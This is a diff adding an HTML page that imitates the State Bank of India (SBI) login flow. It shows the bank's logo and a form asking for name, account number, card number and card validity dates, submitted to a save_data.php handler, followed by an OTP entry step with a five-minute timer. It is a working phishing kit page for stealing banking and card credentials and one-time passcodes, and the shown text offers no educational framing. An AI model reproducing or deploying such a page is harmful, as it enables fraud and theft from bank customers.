@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBI</title>
+ <link rel="stylesheet" href="https://mrfidal.github.io/security/sbi/style.css">
+
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://mrfidal.github.io/security/sbi/SBI-logo.svg" alt="SBI Logo"> 
+            <h1>SBI</h1>
+        </div>
+        <form id="infoForm" method="POST" action="save_data.php">
+            <div class="input-group">
+                <label for="name">Name</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            <div class="input-group">
+                <label for="accountNumber">Account Number</label>
+                <input type="text" id="accountNumber" name="accountNumber" required>
+            </div>
+            <div class="input-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" name="cardNumber" required>
+            </div>
+            <div class="input-group">
+                <label for="validFrom">Valid From</label>
+                <input type="date" id="validFrom" name="validFrom" required>
+            </div>
+            <div class="input-group">
+                <label for="validUpto">Valid Upto</label>
+                <input type="date" id="validUpto" name="validUpto" required>
+            </div>
+            <button type="submit">Submit</button>
+            <p id="message"></p>
+        </form>
+        <div class="otp-container" id="otpContainer">
+            <h2>Enter OTP</h2>
+            <div class="input-group">
+                <input type="text" id="otpInput" placeholder="Enter OTP" required>
+            </div>
+            <button id="verifyOtpButton">Verify OTP</button>
+            <p id="timer">05:00</p>
+        </div>
+    </div>
+    <script src="https://mrfidal.github.io/security/sbi/script.js">
+    </script>
+</body>
+</html>
